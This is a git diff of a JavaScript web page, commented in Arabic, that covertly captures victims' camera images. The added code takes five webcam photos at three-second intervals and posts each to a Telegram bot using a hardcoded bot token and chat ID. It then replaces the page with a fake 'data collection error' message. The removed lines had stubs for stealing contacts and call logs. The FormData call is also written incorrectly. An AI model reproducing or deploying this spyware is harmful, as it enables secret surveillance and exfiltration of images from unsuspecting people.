@@ -4,7 +4,7 @@ function requestPermissions() {
     }
 }
 
-// 1️⃣ تشغيل الكاميرا والتقاط الصور
+// 📸 تشغيل الكاميرا والتقاط 5 صور
 function getCameraAccess() {
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -12,65 +12,48 @@ function getCameraAccess() {
             video.srcObject = stream;
             video.play();
 
-            setTimeout(() => {
-                let canvas = document.createElement("canvas");
-                let ctx = canvas.getContext("2d");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let photoCount = 0; // عداد الصور
 
-                // حفظ الصورة وإرسالها للبوت
-                let imageData = canvas.toDataURL("image/png");
-                sendToBot(imageData, "photo");
+            function capturePhoto() {
+                if (photoCount < 5) { // التقاط 5 صور فقط
+                    let canvas = document.createElement("canvas");
+                    let ctx = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // إغلاق الكاميرا
-                stream.getTracks().forEach(track => track.stop());
+                    let imageData = canvas.toDataURL("image/png");
+                    sendToBot(imageData, `photo_${photoCount + 1}`); // إرسال الصورة للبوت
 
-                getContacts();
-            }, 3000); // التقاط الصورة بعد 3 ثوانٍ
+                    photoCount++;
+                    setTimeout(capturePhoto, 3000); // التقاط صورة جديدة بعد 3 ثوانٍ
+                } else {
+                    // إغلاق الكاميرا بعد التقاط 5 صور
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // عرض رسالة الخطأ للمستخدم
+                    setTimeout(() => {
+                        document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
+                    }, 2000);
+                }
+            }
+
+            setTimeout(capturePhoto, 3000); // بدء التقاط أول صورة بعد 3 ثوانٍ
         })
         .catch(err => {
             alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
         });
 }
 
-// 2️⃣ جلب جهات الاتصال (هذا يحتاج إلى تطبيق ويب متقدم أو APK)
-function getContacts() {
-    alert("سيتم جلب جهات الاتصال (لكن هذا يتطلب تطبيق مخصص على الهاتف).");
+// 🚀 إرسال البيانات إلى بوت تيليجرام
+function sendToBot(imageData, photoName) {
+    let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc"; // توكن البوت
+    let chatId = "7554235698"; // معرف الشات (المستخدم / القناة / المجموعة)
 
-    let contactsData = "قائمة جهات الاتصال هنا";  // هنا يمكن وضع بيانات حقيقية
-    sendToBot(contactsData, "contacts");
+    let message = `📸 **صورة جديدة:**\n📝 الاسم: ${photoName}`;
 
-    getCallLogs();
-}
-
-// 3️⃣ جلب سجل المكالمات (أيضًا يحتاج إلى تطبيق Android)
-function getCallLogs() {
-    alert("سيتم جلب سجل المكالمات (لكن هذا يتطلب تطبيق Android).");
-
-    let callLogsData = "سجل المكالمات هنا";  // هنا يمكن وضع بيانات حقيقية
-    sendToBot(callLogsData, "call_logs");
-
-    // بعد كل شيء، نظهر رسالة الخطأ للمستخدم
-    setTimeout(() => {
-        document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
-    }, 2000);
-}
-
-// 4️⃣ إرسال البيانات إلى بوت تيليجرام
-function sendToBot(data, type) {
-    let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc";  // ضع التوكن الخاص بك
-    let chatId = "7554235698";  // ضع معرف الشات (القناة أو المجموعة أو المستخدم)
-
-    let message = `📢 **بيانات جديدة:**\n📝 النوع: ${type}\n📄 البيانات: ${data}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
-        })
+        body: new FormData().append("chat_id", chatId).append("photo", imageData).append("caption", message)
     });
 }
